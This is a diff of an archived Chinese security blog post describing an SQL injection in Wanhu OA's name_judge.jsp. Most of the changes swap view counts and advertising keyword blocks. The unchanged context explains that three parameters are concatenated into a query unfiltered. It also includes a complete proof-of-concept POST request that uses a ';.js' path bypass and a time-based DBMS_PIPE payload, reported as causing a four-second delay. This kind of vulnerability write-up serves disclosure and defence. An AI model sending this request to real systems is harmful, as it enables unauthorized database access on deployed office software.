@@ -7,17 +7,17 @@ asset_dir: assets/万户oa-name_judge.jsp-sql注入漏洞
 # 万户OA name\_judge.jsp SQL注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/7/30 07:39
-- 900浏览
+- 901浏览
 - [0评论](#comment)
 - 18分钟阅读
 
 深入探索
 
-身份验证
+VPN服务
 
-认证
+漏洞修复方案
 
-SQL
+企业安全咨询
 
 ---
 
@@ -67,13 +67,21 @@ try{
         }
 ```
 
+深入探索
+
+Nessus
+
+安全运维咨询
+
+防火墙软件
+
 三个参数`govFormName`、`formId`和`formType`都是直接拼接进SQL语句中然后用`executeQuery`执行，所有参数都**没有过滤或校验**，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
 # 漏洞复现
 
 权限绕过分析参考：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
 
-漏洞扫描服务
+代码安全审计
 
 ```
 POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
@@ -83,14 +91,6 @@ Content-Type: application/x-www-form-urlencoded
 formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',4)--&govFormName=1&formId=1
 ```
 
-深入探索
-
-代码安全审计
-
-VPN服务
-
-JSON处理工具
-
 成功延时4秒
 
 [![万户OA name_judge.jsp SQL注入漏洞](images/img-001-0bc0fa43c20b.webp)](https://image.mrxn.net/d143ab9044034eac9268e6c50eff19a1.webp)
@@ -98,7 +98,7 @@ JSON处理工具
 其他万户OA 相关[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)  
 [万户OA系列漏洞](https://mrxn.net/tag/ezoffice)
 
-广告与营销
+漏洞扫描服务
 
 - 标签：
 - [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
